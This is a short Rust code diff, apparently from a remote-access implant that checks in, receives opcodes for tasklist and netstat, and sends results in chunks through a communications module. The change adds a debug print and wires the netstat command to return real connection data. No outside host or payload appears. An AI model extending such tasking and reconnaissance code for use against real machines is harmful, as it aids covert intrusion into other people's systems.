@@ -171,6 +171,14 @@ impl Shell {
             chunk_msg.extend_from_slice(&(chunk.len() as u32).to_be_bytes());
             chunk_msg.extend_from_slice(chunk);
 
+            println!(
+                "Sending {} bytes out of {} as chunk {} out of total chuncks {}",
+                chunk_msg.len(),
+                data.len(),
+                chunk_index,
+                total_chunks
+            );
+
             if bus
                 .send(BusMessage {
                     identity: ModuleIdentity::COMMS,
@@ -193,11 +201,6 @@ impl Module for Shell {
         self.identity
     }
     async fn run(&self, bus_channel: Sender<BusMessage>, token: CancellationToken) {
-        // debug
-        let mut netstat = Netstat::new();
-        netstat.get_connections();
-        // end debug
-
         if self.perform_checkin(&bus_channel).await.is_err() {
             token.cancel();
             return;
@@ -223,8 +226,7 @@ impl Module for Shell {
                             ShellOpcodes::Tasklist => self.tasklist.get_snapshot(),
                             ShellOpcodes::Netstat => {
                                 let mut netstat = Netstat::new();
-                                netstat.get_connections();
-                                Ok(Vec::new())
+                                netstat.get_connections()
                             },
                             ShellOpcodes::List => {Ok(Vec::new())},
                         };
